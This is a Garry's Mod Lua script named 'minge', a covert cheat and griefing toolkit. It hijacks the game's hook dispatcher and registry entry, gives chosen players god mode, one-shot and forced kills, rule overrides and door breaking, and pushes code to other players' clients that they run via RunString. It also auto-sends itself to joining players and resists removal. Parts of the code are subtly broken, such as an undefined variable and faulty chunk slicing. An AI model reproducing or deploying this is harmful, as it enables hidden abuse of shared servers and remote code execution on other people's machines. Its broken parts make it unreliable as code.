setfenv(1,_G)

if _G.minge then
	_G.minge:Print("Cleaning existing version")
	_G.minge:CleanUp(true)
	_G.minge = nil
end

local minge = {}
local PLY = FindMetaTable("Player")

minge.OwnerID = "STEAM_0:0:80006525"
minge.Callbacks = {}
minge.Config = {
	DebugPrints = false, AllowDamages = false, AllowWeaponDrop = false, AllowPhysgun = false,
	GodByPass = false, ReverseDamages = false, ReloadWeaponsOnKillFail = false, InfiniteAmmos = false, FastFire = false,
	WeaponOPStats = false, Aimbot = false, ESP = false, RulesOverride = false, ExplosiveBullets = false, HellSender = false,
	Repulsor = false, InfiniteSSJump = false, AutoReplier = false, AutoRevive = false, RandomizePlayermodel = false,
	FlashlightSpam = false, DoorByPass = false,

	EradicatePAC = false, -- once done cannot be undone
}

function minge:IsOwnerClient()
	if not CLIENT then return false end
	local lp = LocalPlayer()
	return lp:IsValid() and lp:SteamID() == self.OwnerID
end

function minge:Print(...)
	if (self.Config.DebugPrints and SERVER) or CLIENT then
		local args = { ... }
		for k, v in pairs(args) do
			args[k] = tostring(v)
		end

		MsgC(Color(160, 59, 207), "[minge] ", Color(193, 110, 231), table.concat(args, "\t") .. "\n")
	end
end

if minge:IsOwnerClient() then
	chat.AddText(Color(160, 59, 207), "[minge] ", Color(193, 110, 231), "Starting...")
	minge:Print("Starting...")
end

function minge:On(event,cb)
	self.Callbacks[event] = cb
end

function minge:Off(event)
	self.Callbacks[event] = nil
end

minge.OldHookCall = minge.OldHookCall or hook.Call
function hook.Call(identifier, gm, ...)
	if _G.minge then
		local cb = _G.minge.Callbacks[identifier]
		local ret
		if cb then ret = cb(_G.minge,...) end
		if ret ~= nil then return ret end
	end

	return minge.OldHookCall(identifier, gm, ...)
end

local Reg = debug.getregistry and debug.getregistry or function() return {} end
local function RegFindFunc(func)
	local reg = Reg()
	for k,v in pairs(reg) do
		if v == func then return k end
	end
end

do
	local index = RegFindFunc(minge.OldHookCall)
	if index then
		Reg()[index] = hook.Call
	else
		minge:Print("Couldn't find registry function?")
	end
end

function minge:CleanUp(weapon_reload)
	if weapon_reload == nil then
		weapon_reload = true -- probably called from a dev
	end

	self:Print("Cleaning up" .. (weapong_reload and " and reloading weapons" or ""))

	local mcall = hook.Call
	hook.Call = self.OldHookCall
	local index = RegFindFunc(mcall)
	if index then
		Reg()[index] = hook.Call
	else
		minge:Print("Couldn't set back registry function")
	end

	if SERVER then
		self:DisallowAll(weapon_reload)

		PLY.MingeAllow = nil
		PLY.MingeDisallow = nil
	end

	self.Callbacks = {}
	_G.minge = nil
	net.Receivers.minge_config = nil
	net.Receivers.minge_code_upload = nil
	net.Receivers.minge_code_upload_finished = nil
end

function minge:MingeWeaponTable(tbl)
	if self.Config.FastFire then
		tbl.Delay = 0.01
	end

	tbl.ClipSize    = 2e6
	tbl.DefaultClip = 2e6
	tbl.Damage      = 2e6
	tbl.Automatic   = true
	tbl.Range       = 2e6
	tbl.DelayHit    = 0.01
	tbl.LastFire    = 0
	tbl.Force       = 9e4
	tbl.Recoil      = 0
end

minge.WeaponCallbacks = {
	weapon_medkit = function(self, wep)
		wep.old_Reload = wep.old_Reload or wep.Reload
		wep.Reload = function(...)
			wep.old_Reload(...)
			if self.Config.FastFire then
				local time = CurTime()
				wep.next_charge = time
				wep.next_reload = time
				wep:SetNextPrimaryFire(CurTime())
				wep:SetNextSecondaryFire(CurTime())
			end
		end
	end,
	lite_smokegrenade = function(self, wep)
		if not SERVER then return end
		wep.PrimaryAttack = function(self, ...)
			local owner = self:GetOwner()
			if not IsValid(owner) then return end

			local hit_pos = owner:GetEyeTrace().HitPos
			for _ = 1, 5 do
				local nade = ents.Create("ent_lite_smokegrenade")
				nade:SetPos(hit_pos)
				nade:Spawn()
				timer.Simple(1, function()
					nade:Explode()
				end)

				local phys = nade:GetPhysicsObject()
				if IsValid(phys) then
					phys:SetVelocity(Vector(math.random(-1000, 1000), math.random(-1000, 1000), math.random(50, 1000)))
				end
			end
		end
	end,
	weapon_nobar = function(self, wep)
		wep.old_PrimaryAttack = function(self, secondary)
			local tracedata = {}
			local tr = self:GetOwner()
			tracedata.start = tr:GetShootPos()
			tr = self:GetOwner()
			local vPoint = self:GetOwner()
			tracedata.endpos = tr:GetShootPos() + vPoint:GetAimVector() * 75
			tracedata.filter = self:GetOwner()
			tracedata.mins = Vector(-16, -16, -16)
			tracedata.maxs = Vector(16, 16, 16)
			tr = util.TraceHull(tracedata)

			self:SetNextPrimaryFire(CurTime())
			self:SetNextSecondaryFire(CurTime())
			self._nextno = CurTime()
			if tr.Hit and not tr.HitPos then
				vPoint = self:GetOwner()
			end

			local effectdata = EffectData ()
			effectdata:SetOrigin(vPoint.EyePos (vPoint))
			util.Effect("nobar_no", effectdata)
			self:EmitSound("vo/citadel/br_no.wav", 75, math.Rand (97, 105) + 0)
			self:GetOwner():DoAttackEvent()

			if SERVER and secondary then
				self:ThrowStuffAround(tr)
			end
		end
	end
}
minge.WeaponCallbacks.nobar = minge.WeaponCallbacks.weapon_nobar

function minge:MingeWeapon(wep)
	if not IsValid(wep) or not wep:IsWeapon() then return end
	local owner = wep:GetOwner()
	local nick = owner:IsValid() and owner:Nick() or "[NULL]"

	wep.unrestricted_gun = true
	if not wep.Minged then
		self:Print(nick .. " minging " .. wep:GetClass())
	end

	if self.Config.WeaponOPStats then
		if type(wep.Primary) == "table" then
			self:MingeWeaponTable(wep.Primary)
		end

		if type(wep.Secondary) == "table" then
			self:MingeWeaponTable(wep.Secondary)
		end
	end

	if SERVER and self.Config.InfiniteAmmos then
		wep:SetClip1(2e6)
		wep:SetClip2(2e6)
	end

	wep.old_PrimaryAttack = wep.old_PrimaryAttack or wep.PrimaryAttack
	wep.PrimaryAttack = function(...)
		if CLIENT and self.Config.Aimbot then minge:Aimbot() end
		wep.old_PrimaryAttack(...)
		if self.Config.FastFire then wep:SetNextPrimaryFire(CurTime()) end
	end

	wep.old_SecondaryAttack = wep.old_SecondaryAttack or wep.SecondaryAttack
	wep.SecondaryAttack = function(...)
		if CLIENT and self.Config.Aimbot then minge:Aimbot() end
		wep.old_SecondaryAttack(...)
		if self.Config.FastFire then wep:SetNextSecondaryFire(CurTime()) end
	end

	local wep_class = wep:GetClass()
	if self.WeaponCallbacks[wep_class] then
		self.WeaponCallbacks[wep_class](self, wep)
	end

	wep.Minged = true

	return false
end

local REPULSOR = {
	Base = "base_anim",
	Type = "anim",
	PrintName = "Repulsor",
	Spawnable = false,
	AdminOnly = true
}

if SERVER then
	function REPULSOR:TryGetOwner()
		if self.CPPIGetOwner then
			return self:CPPIGetOwner()
		end

		return NULL
	end

	local REPULSOR_RANGE = 200
	function REPULSOR:Initialize()
		self:SetSolid(SOLID_VPHYSICS)
		self:SetModel("models/hunter/blocks/cube025x025x025.mdl")
		self:SetNoDraw(true)
		self:SetNotSolid(true)

		local brush = ents.Create("base_brush")
		brush:SetPos(self:GetPos())
		brush:SetParent(self)
		brush:SetTrigger(true)
		brush:SetSolid(SOLID_BBOX)
		brush:SetNotSolid(true)
		brush:SetCollisionBounds(Vector(-200,-200,-200), Vector(200,200,200))

		local repulsor = self
		brush.Touch = function(self, ent)
			local owner = repulsor:TryGetOwner()
			if owner == ent then return end

			local ent_owner = ent.CPPIGetOwner and ent:CPPIGetOwner() or ent:GetOwner()
			if ent_owner == owner or minge:IsAllowed(ent_owner) then return end
			if minge and owner:WorldSpaceCenter():Distance(ent:WorldSpaceCenter()) <= REPULSOR_RANGE then
				minge:Repulse(owner, ent)
			end
		end

		self.Brush = brush
	end

	function REPULSOR:Think()
		local owner = self:TryGetOwner()
		for _, ent in ipairs(ents.FindInSphere(self:WorldSpaceCenter(), REPULSOR_RANGE)) do
			if not ent:IsPlayer() and not ent:CreatedByMap() and owner ~= ent then
				local ent_owner = ent.CPPIGetOwner and ent:CPPIGetOwner() or ent:GetOwner()
				if ent_owner ~= owner and not minge:IsAllowed(ent_owner) then
					minge:Repulse(owner, ent)
				end
			end
		end

		self:NextThink(CurTime() + 1)
		return true
	end
end

scripted_ents.Register(REPULSOR, "minge_repulsor")

if SERVER then
	util.AddNetworkString("minge_code_upload")
	util.AddNetworkString("minge_code_upload_finished")
	util.AddNetworkString("minge_config")

	minge.IDs = {}
	minge.Repulsors = {}
	minge.ClientScripts = {}

	net.Receive("minge_config", function(_, ply)
		if ply:SteamID() ~= minge.OwnerID then return end

		local config = net.ReadTable()
		local trigger_callbacks = net.ReadBool()

		if not trigger_callbacks then
			minge.Config = config
		else
			for k,v in pairs(config) do
				minge:SetConfigValue(k, v)
			end
		end
	end)

	local parts = {}
	local script_path = "default"
	net.Receive("minge_code_upload", function(_, ply)
		if ply:SteamID() ~= minge.OwnerID then return end

		local part = net.ReadString()
		local is_first = net.ReadBool()

		if is_first then
			parts = {} -- we make sure to empty that
			script_path = net.ReadString()
		end

		table.insert(parts, part)

		local is_last = net.ReadBool()
		if is_last then
			minge:Print("Received code from client")
			local code = table.concat(parts)
			minge.ClientScripts[script_path] = code
			parts = {}

			timer.Simple(0, function()
				net.Start("minge_code_upload_finished")
				net.WriteString(script_path)
				net.Send(ply)
			end)
		end
	end)

	function minge:ForPlayers(callback)
		for id, _ in pairs(self.IDs) do
			local ply = player.GetBySteamID(id)
			if IsValid(ply) then
				callback(self, ply)
			end
		end
	end

	minge.ConfigCallbacks = {
		Repulsor = function(self, val)
			if val then
				self:ForPlayers(function(self, ply)
					self:AttachRepulsor(ply)
				end)
			else
				self:ForPlayers(function(self, ply)
					self:DestroyRepulsor(ply)
				end)
			end
		end,
		EradicatePAC = function(self, val)
			if val then
				self:ForPlayers(function(self, ply)
					self:UploadCodeToClient(ply, "lua/minge/client_scripts/eradicate_pac.lua")
				end)
			end
		end
	}

	function minge:AttachRepulsor(ply)
		if not self:IsAllowed(ply) then return end

		local repulsor = ents.Create("minge_repulsor")
		repulsor:SetPos(ply:WorldSpaceCenter())
		repulsor:SetParent(ply)
		repulsor:Spawn()
		if repulsor.CPPISetOwner then
			repulsor:CPPISetOwner(ply)
		end
		self.Repulsors[ply] = repulsor
	end

	function minge:DestroyRepulsor(ply)
		SafeRemoveEntity(self.Repulsors[ply])
		self.Repulsors[ply] = nil
	end

	function minge:SetConfigValue(key, val)
		if self.Config[key] == nil or self.Config[key] == val then return end

		self.Config[key] = val
		net.Start("minge_config")
		net.WriteString(key)
		net.WriteBool(val)
		net.Broadcast()

		if self.ConfigCallbacks[key] then
			self:Print("Calling callback for config key " .. key .. " with value " .. tostring(val))
			self.ConfigCallbacks[key](self, val)
		end
	end

	function minge:BoomAt(ply)
		if not self:IsAllowed(ply) then return end

		local pos = ply:GetEyeTrace().HitPos
		local explosion = ents.Create("env_explosion")
		explosion:SetPos(pos)
		explosion:Spawn()

		local info = DamageInfo()
		info:SetAttacker(ply)
		info:SetInflictor(explosion)
		info:SetDamageType(DMG_DISSOLVE)
		info:SetDamage(100)
		util.BlastDamageInfo(info, pos, 250)

		explosion:Fire("explode")
	end

	local function ClampVec(vec, lim)
		vec.x = math.Clamp(vec.x, -lim, lim)
		vec.y = math.Clamp(vec.y, -lim, lim)
		vec.z = math.Clamp(vec.z, -lim, lim)

		return vec
	end

	local function RemoveStaticfy(ent)
		if ent._staticfied then
			print(ent)
			ent.EntityMods.staticfy = nil
			ent._staticfied = nil
			ent._staticfy_prevt = nil
			ent:SetMoveType(MOVETYPE_VPHYSICS)
		end
	end

	function minge:Repulse(ent_origin, ent)
		if not IsValid(ent_origin) or not IsValid(ent) then return end
		if not self:IsAllowed(ent_origin) or self:IsAllowed(ent) then return end
		if ent:CreatedByMap() or (not ent:IsPlayer() and ent.CPPIGetOwner and not IsValid(ent:CPPIGetOwner())) then return end

		ent:PhysWake()

		if ent:IsPlayerHolding() then ent:ForcePlayerDrop() end
		if ent:IsPlayer() or ent:IsNPC() then
			local force = ClampVec((ent:WorldSpaceCenter() - ent_origin:WorldSpaceCenter()):GetNormalized() * 1000, 9999)
			if pac and ent.pac_movement then
				ent.pac_movement = nil
			end
			if ent:IsPlayer() and ent:InVehicle() then ent:ExitVehicle() end
			ent:SetMoveType(ent:IsPlayer() and MOVETYPE_WALK or MOVETYPE_STEP)
			ent:SetVelocity(force)
		else
			RemoveStaticfy(ent)
			constraint.RemoveAll(ent)
			local phys = ent:GetPhysicsObject()
			if IsValid(phys) then
				local force = ClampVec((ent:WorldSpaceCenter() - ent_origin:WorldSpaceCenter()) * 9999, 9999999)
				phys:Wake()
				phys:EnableGravity(false)
				phys:EnableMotion(true)
				phys:EnableCollisions(true)
				phys:SetVelocity(force)
			end
		end
	end

	function minge:DissolveEnt(ent)
		if ent:IsPlayer() or ent:IsNPC() then return end

		local dissolver = ents.Create("env_entity_dissolver")
		dissolver:SetPos(ent:GetPos())
		dissolver:Spawn()
		dissolver:Activate()
		dissolver:SetNotSolid(true)

		local name = "dissolvemenao" .. ent:EntIndex()
		ent:SetName(name)
		dissolver:SetKeyValue("target",name)
		dissolver:SetKeyValue("dissolvetype","3")
		dissolver:SetKeyValue("magnitude",1500)
		dissolver:Fire("Dissolve",name,0)

		SafeRemoveEntityDelayed(dissolver, 1.5)
	end

	function minge:IsAllowed(ply)
		return IsValid(ply) and ply:IsPlayer() and self.IDs[ply:SteamID()] or false
	end

	function minge:UploadCodeToClient(ply, path)
		if not IsValid(ply) or not str or str == "" then return end
		if not self.ClientScripts[path] then return end

		local str, max = self.ClientScripts[path], 60000
		local n = math.ceil(#str / max)
		self:Print("Uploading code of " .. #str .. " chars to client " .. tostring(ply) .. "with path \'" .. path .. "\'")
		for i = 1, n do
			local part = str:sub(max * (i - 1), max)
			net.Start("minge_code_upload")
			net.WriteString(part)
			net.WriteBool(i == 1) -- is first part
			net.WriteBool(i == n) -- is last part
			net.Send(ply)
		end
	end

	function minge:LiftRestrictions(ply, bool)
		--RunConsoleCommand("aowl", "restrictions", ply:Nick(), bool and "0" or "1")
		--[[if not bool then
			ply.Unrestricted = nil
		else
			ply.Unrestricted = true
		end

		net.Start("aowl_cmds_restrictions")
		net.WriteEntity(ply)
		net.WriteBool(not bool)
		net.Broadcast()]]--
	end

	function minge:Allow(ply)
		if not IsValid(ply) or not ply:IsPlayer() then return end
		local id = ply:SteamID()
		self.IDs[id] = true
		if self.Config.Repulsor then
			self:AttachRepulsor(ply)
		end

		for path, _ in pairs(self.ClientScripts) do
			if path ~= "lua/minge/client_scripts/end.lua" then
				self:UploadCodeToClient(ply, path)
			end
		end

		ply:SetCollisionGroup(COLLISION_GROUP_WORLD)
		self:LiftRestrictions(ply, true)
		self:Print("Allowing " .. ply:Nick())
	end

	function minge:Disallow(ply, weapon_reload)
		if not IsValid(ply) or not ply:IsPlayer() then return end
		local id = ply:SteamID()
		self.IDs[id] = nil
		if weapon_reload then
			self:ReloadWeapons(ply)
		end

		ply:SetCollisionGroup(COLLISION_GROUP_PLAYER)
		self:DestroyRepulsor(ply)
		self:UploadCodeToClient(ply, "lua/minge/client_scripts/end.lua")
		self:LiftRestrictions(ply, false)

		self:Print("Removing " .. ply:Nick())
	end

	function minge:DisallowAll(weapon_reload)
		for _, ply in ipairs(player.GetAll()) do
			if self:IsAllowed(ply) then
				self:Disallow(ply, weapon_reload)
			end
		end
	end

	function minge:AllowAll()
		for _, ply in ipairs(player.GetAll()) do
			self:Allow(ply)
		end
	end

	function minge:AllowFriends()
		local me = player.GetBySteamID(self.OwnerID)
		if not IsValid(me) then return end
		for _, ply in ipairs(player.GetAll()) do
			if ply.IsFriend and ply:IsFriend(me) then
				self:Allow(ply)
			end
		end
	end

	local valid_door_classes = {
		prop_door_rotating = true,
	}
	minge:On("PlayerUse", function(self, ply, ent)
		if not self:IsAllowed(ply) then return end
		if not self.Config.DoorByPass then return end

		local blow_up = false
		local class = ent:GetClass():lower()
		if class:match("func_door.*") or valid_door_classes[class] then
			self:Print("Forcing door to open", ent)
			ent:Fire("unlock")
			ent:Fire("toggle")
			blow_up = true
		elseif class == "func_breakable" then
			ent:Fire("break")
			blow_up = true
		elseif class == "func_movelinear" then
			local pos, save_table = ent:GetPos(), ent:GetSaveTable()
			local dist1, dist2 = save_table.m_vecPosition1:Distance(pos), save_table.m_vecPosition2:Distance(pos)
			ent:Fire("unlock")
			ent:Fire(dist1 < dist2 and "open" or "close")
			blow_up = true
		end

		if blow_up and ent.PropDoorRotatingExplode then
			ent:PropDoorRotatingExplode(ply:GetAimVector() * 9999, 5, true, true)
		end
	end)

	minge:On("PlayerShouldTakeDamage",function(self,p,atck)
		if self:IsAllowed(p) and not self.Config.AllowDamages then return false end
		if self:IsAllowed(atck) and self.Config.GodByPass then return true end
	end)

	local function TryGetPlayer(ent)
		local atck = ent
		if IsValid(atck) then
			if atck:IsWeapon() then
				atck = atck:GetOwner()
			else
				local phys_atck = atck:GetPhysicsAttacker(5)
				if IsValid(phys_atck) then
					atck = phys_atck
				elseif not atck:IsPlayer() and atck.CPPIGetOwner then
					atck = atck:CPPIGetOwner()
				end
			end
		end

		return atck
	end

	minge:On("EntityFireBullets", function(self, ent, data)
		if not self.Config.ExplosiveBullets then return end
		local ply = TryGetPlayer(ent)
		self:BoomAt(ply)
	end)

	minge:On("EntityTakeDamage",function(self, tar, info)
		local atck = TryGetPlayer(info:GetAttacker())
		if not self.Config.AllowDamages and self:IsAllowed(atck) and self:IsAllowed(tar) then return true end

		if self:IsAllowed(atck) and self.Config.WeaponOPStats then
			local limit = tar:IsPlayer() and 9999 or 9999999
			local force = ClampVec((atck:WorldSpaceCenter() - tar:WorldSpaceCenter()) * 9999, limit)
			info:SetDamageForce(-force)
			info:SetDamage(2e6)
			info:SetDamageType(DMG_DISSOLVE)
			if tar:IsPlayer() and tar:HasGodMode() then
				tar:KillSilent()
				gamemode.Call("PlayerDeath", tar, atck:GetActiveWeapon(), atck)
				self:Print(atck:Nick() .. " force killing " .. tar:Nick() .. "?!?")
			end
		elseif self:IsAllowed(tar) then
			if self.Config.HellSender and landmark and IsValid(atck) then
				local destination = landmark.get("hll")
				if destination then
					atck:SetPos(destination)
					self:Print(tar:Nick() .. " sent " .. atck:Nick() .. " to hell")
				else
					atck:Ignite(10, 300)
				end
			end

			if self.Config.ReverseDamages and IsValid(atck) and atck ~= tar then
				local pre = atck.Health and atck:Health() or 0
				local limit = atck:IsPlayer() and 9999 or 9999999
				local force = ClampVec((tar:WorldSpaceCenter() - atck:WorldSpaceCenter()) * 9999, limit)
				info:SetDamageForce(-force)
				info:SetAttacker(tar)
				if tar:IsPlayer() then
					local wep = tar:GetActiveWeapon()
					if IsValid(wep) then
						info:SetInflictor(tar:GetActiveWeapon())
					else
						info:SetInflictor(tar)
					end
				else
					info:SetInflictor(tar)
				end
				atck:TakeDamageInfo(info)
				if atck.Health and atck:Health() == pre then
					atck:SetHealth(pre - info:GetDamage())
					if atck:Health() <= 0 then
						if not atck:IsPlayer() then
							atck:Remove()
							self:Print(tar:Nick() .. " wtf is " .. atck:GetClass() .. "?? Removing.")
						else
							if atck:Alive() then
								atck:KillSilent()
								gamemode.Call("PlayerDeath",atck,tar:GetActiveWeapon(),tar)
								self:Print(tar:Nick() .. " force killing " .. atck:Nick() .. "?!?")
							end
						end
					end
				end
			end

			if not self.Config.AllowDamages then
				return true
			end
		end
	end)

	minge:On("PlayerSwitchWeapon",function(self,ply,oldwep,wep)
		if not self:IsAllowed(ply) then return end
		self:MingeWeapon(oldwep)
		self:MingeWeapon(wep)
	end)

	minge:On("PlayerDroppedWeapon",function(self,ply,wep)
		if self:IsAllowed(ply) and not self.Config.AllowWeaponDrop then
			SafeRemoveEntity(wep)
		end
	end)

	do -- physgun stuff
		local function PhysgunObliterate(self, ply, ent)
			local info = DamageInfo()
			local limit = ent:IsPlayer() and 9999 or 9999999
			local force = ClampVec((ply:WorldSpaceCenter() - ent:WorldSpaceCenter()) * 9999, limit)
			local wep = ply:GetActiveWeapon()

			info:SetAttacker(ply)
			info:SetInflictor(wep)
			info:SetDamageForce(-force)
			info:SetDamage(2e6)
			info:SetDamageType(DMG_DISSOLVE)

			local old_health = ent:Health()
			ent:TakeDamageInfo(info)
			if ent:Health() >= old_health then
				if ent:IsPlayer() then
					if ent:HasGodMode() then
						ent:KillSilent()
						gamemode.Call("PlayerDeath", ent, wep, ply)
						self:Print(ply:Nick() .. " force killing " .. ent:Nick() .. "?!?")
					end
				else
					self:DissolveEnt(ent)
				end
			end
		end

		minge:On("PhysgunPickup", function(self, ply, ent)
			if not self.Config.RulesOverride then return end
			if self:IsAllowed(ply) then
				if ent:IsPlayer() then
					ent:SetMoveType(MOVETYPE_NONE)
					-- for throwing players
					ent._is_being_physgunned = ply
				elseif ent:IsNPC() then
					ent:SetMoveType(MOVETYPE_FLYGRAVITY)
				elseif ent:GetMoveType() == MOVETYPE_NONE then
					ent:SetMoveType(MOVETYPE_VPHYSICS)
				end

				if ply:KeyDown(IN_WALK) then
					if ent:IsPlayer() then
						ent._pos_velocity = {}
						ent._is_being_physgunned = false
					end
					PhysgunObliterate(self, ply, ent)
					return false
				end

				self:Print(ply:Nick() .. " picked up " .. (ent:IsPlayer() and ent:Nick() or tostring(ent)))
				return true
			elseif self:IsAllowed(ent) and not self.Config.AllowPhysgun then
				self:Print(ply:Nick() .. " attempted to pickup " .. ent:Nick())
				return false
			end
		end)

		local function GetAverage(tbl)
			if #tbl == 1 then return tbl[1] end
			local average = vector_origin

			for key, vec in pairs(tbl) do
				average = average + vec
			end

			return average / #tbl
		end

		local function CalcVelocity(ply, pos)
			ply._pos_velocity = ply._pos_velocity or {}
			if #ply._pos_velocity > 10 then
				table.remove(ply._pos_velocity, 1)
			end

			table.insert(ply._pos_velocity, pos)
			return GetAverage(ply._pos_velocity)
		end

		local next_yeet_say = 0
		local yeet_lines = {
			"yeet",
			"begone thot#3",
			"begone thot#1",
			"poof"
		}
		minge:On("Move", function(self, ply, data)
			local physgunner = ply.IsBeingPhysgunned and ply:IsBeingPhysgunned() or nil
			if IsValid(physgunner) and self:IsAllowed(physgunner) then
				local vel = CalcVelocity(ply, data:GetOrigin())
				if vel:Length() > 10 then
					local new_vel = (data:GetOrigin() - vel) * 10
					data:SetVelocity(new_vel)
					if new_vel:Length() >= 10000 then -- usually a yeet from the physgunner
						ply:Ignite(10, 300)
						if CurTime() >= next_yeet_say then
							physgunner:Say(yeet_lines[math.random(#yeet_lines)] .. ":echo")
							next_yeet_say = CurTime() + 5
						end
					end
				end
			end
		end)

		local function PhysgunDropPlayer(self, ply, ply2)
			ply2._pos_velocity = {}
			ply2._is_being_physgunned = false
			ply2:SetMoveType(MOVETYPE_WALK)

			if ply:KeyDown(IN_ZOOM) then
				local destination = landmark and landmark.get("hll") or nil
				if destination then
					ply2:SetPos(destination)
					self:Print(ply:Nick() .. " sent " .. ply2:Nick() .. " to hell")
				end
			end

			if ply:KeyDown(IN_ATTACK2) then
				ply2:SetMoveType(MOVETYPE_NOCLIP)
			end
		end

		local function PhysgunDropNPC(self, ply, npc)
			npc:SetMoveType(MOVETYPE_STEP)

			if ply:KeyDown(IN_ZOOM) then
				npc:Fire("ignite")
				SafeRemoveEntityDelayed(npc, 2)
			end

			if ply:KeyDown(IN_ATTACK2) then
				npc:SetMoveType(MOVETYPE_FLY)
			end
		end

		minge:On("PhysgunDrop", function(self, ply, ent)
			if not self.Config.RulesOverride then return end
			if self:IsAllowed(ply) then
				if ent:IsPlayer() then
					PhysgunDropPlayer(self, ply, ent)
				elseif ent:IsNPC() then
					PhysgunDropNPC(self, ply, ent)
				end

				if ply:KeyDown(IN_WALK) then
					PhysgunObliterate(self, ply, ent)
				end
			end
		end)
	end

	minge:On("ExecuteStringCommand", function(self, steamid, cmd)
		local ply = player.GetBySteamID(steamid)
		if not IsValid(ply) then return end

		if self:IsAllowed(ply) and cmd:match("ssjump") and self.Config.InfiniteSSJump then
			ply.SSJumped = false
			ply.SSJumpedDown = false
		end
	end)

	local function CanX(self,ply,_)
		if not self.Config.RulesOverride then return end
		if self:IsAllowed(ply) then return true end
	end

	local hooks = {
		"CanDrive", "CanProperty", "CanTool", "PlayerNoClip", "CanPlyGoto", "CanPlyRespawn",
		"CanCarryPlayer", "CanPlyGotoPly", "CanPlyGoto", "CanPlyGoBack", "CanUseItem", "CanPlayerUnfreeze",
		"PlayerCanPickupWeapon", "PlayerCanPickupItem", "CanPlayerHax", "CanSSJump", "PlayerCanSuicide",
		"CanPlyTeleport", "CanExitVehicle", "CanKidMode", "CanPlayerEnterVehicle", "CanEditVariable", "PlayerCanJoinTeam",

		-- ("CanLuaDev", "CanHTTP") NEVER ADD THESE CAN BE USED FOR MALICIOUS STUFF
		-- ("PlayerCanHearPlayersVoice", "PlayerCanSeePlayersChat") PRIVACY BREACH

		"PlayerGiveSWEP", "PlayerSpawnEffect", "PlayerSpawnSWEP", "PlayerSpawnNPC", "PlayerSpawnObject", "PlayerSpawnProp",
		"PlayerSpawnRagdoll", "PlayerSpawnSENT", "PlayerSpawnVehicle"
	}

	for _, hook_name in ipairs(hooks) do
		minge:On(hook_name, CanX)
	end

	function minge:ReloadWeapons(ply)
		ply:StripWeapons()
		gamemode.Call("PlayerLoadout", ply)
	end

	PLY.MingeAllow = function(ply)
		minge:Allow(ply)
	end

	PLY.MingeDisallow = function(ply)
		minge:Disallow(ply)
	end

	minge:On("PlayerDisconnected", function(self, ply)
		if ply:SteamID() == self.OwnerID then
			self:CleanUp(false)
		elseif self:IsAllowed(ply) then
			self:Disallow(ply, false)
		end
	end)

	minge:On("PlayerSpawn", function(self, ply)
		if self:IsAllowed(ply) then
			ply:SetCollisionGroup(COLLISION_GROUP_WORLD)
		end
	end)

	-- automate sending minge so not forgotten
	-- only works on meta for sure
	minge:On("PlayerInitPostEntity", function(self, ply)
		if not _G.luadev then return end -- in case we remove luadev from meta (?)

		local me = player.GetBySteamID(self.OwnerID)
		if IsValid(me) then
			timer.Simple(1, function()
				local cmd = ("lua_send_cl _%d minge/init.lua"):format(ply:EntIndex())
				me:ConCommand(cmd)
			end)
		end
	end)
end

local bads = { "destroy", "destroyall", "delreg", "remove" }
minge:On("AowlCommand", function(self, t, ply, line) -- also exists on client
	if t.cmd == "badlua" and table.HasValue(bads, line) then
		self:CleanUp(true)
	end
end)

if CLIENT then
	function minge:Aimbot() end

	local parts = {}
	net.Receive("minge_code_upload",function()
		local part = net.ReadString()
		local is_first, is_last = net.ReadBool(), net.ReadBool()

		if is_first then parts = {} end-- we make sure to empty that

		table.insert(parts, part)

		if is_last then
			minge:Print("Received code from server, running...")
			local code = table.concat(parts)
			local err = RunString(code, "minge", false)
			if err and err ~= "" then
				minge:Print(err)
			end
			parts = {}
		end
	end)

	net.Receive("minge_config", function()
		local key = net.ReadString()
		local val = net.ReadBool()
		minge.Config[key] = val
	end)

	if minge:IsOwnerClient() then
		net.Receive("minge_code_upload_finished", function()
			local path = net.ReadString()
			hook.Run("OnMingeFileUploadFinished", path)
		end)

		function minge:UploadFileToServer(path,callback)
			if not file.Exists(path, "GAME") then return end

			local code = file.Read(path, "GAME")
			local max = 60000
			local n = math.ceil(#code / max)
			self:Print("Uploading script of " .. #code .. " chars to server with path \'" .. path .. "\'''")
			for i = 1, n do
				local part = code:sub(max * (i - 1), max)
				net.Start("minge_code_upload")
				net.WriteString(part)
				net.WriteBool(i == 1) -- is first part
				if i == 1 then net.WriteString(path) end
				net.WriteBool(i == n) -- is last part
				net.SendToServer()
			end

			if callback then
				hook.Add("OnMingeFileUploadFinished", path, function(p)
					if p == path then
						callback()
						hook.Remove("OnMingeFileUploadFinished", path)
					end
				end)
			end
		end

		function minge:UploadConfigToServer(load_file, config_callbacks)
			if load_file then
				if not file.Exists("lua/minge/config.json", "GAME") then return end
				config = util.JSONToTable(file.Read("lua/minge/config.json", "GAME"))
				if not config then return end

				self.Config = config
			end

			net.Start("minge_config")
			net.WriteTable(self.Config)
			net.WriteBool(config_callbacks or false)
			net.SendToServer()
		end

		local t = RealTime()
		minge:UploadConfigToServer(true, false)
		local files = (file.Find("lua/minge/client_scripts/*.lua", "GAME"))
		for i, f in ipairs(files) do
			minge:UploadFileToServer("lua/minge/client_scripts/" .. f, function()
				if i == #files then
					hook.Run("OnMingeFinishedLoadingScripts")

					local msg = ("Done (%.2fs)"):format(RealTime() - t)
					chat.AddText(Color(160, 59, 207), "[minge] ", Color(193, 110, 231), msg)
					minge:Print(msg)
				end
			end)
		end
	end
end

local function ReadOnlyTable(index)
	local protecteds = {}
	for k,v in pairs(index) do
		protecteds[k] = true
	end

	local meta = {
		__newindex = function(tbl,key,value)
			if protecteds[key] then
				local msg = "Please stop your shit and call minge:CleanUp()"
				if _G.minge then _G.minge:Print(msg) else error(msg,0) end
			else
				rawset(tbl,key,value)
			end
		end,
		__metatable = false,
	}
	meta.__index = meta

	return setmetatable(index,meta)
end

minge = ReadOnlyTable(minge)
minge.__index = minge
_G.minge = minge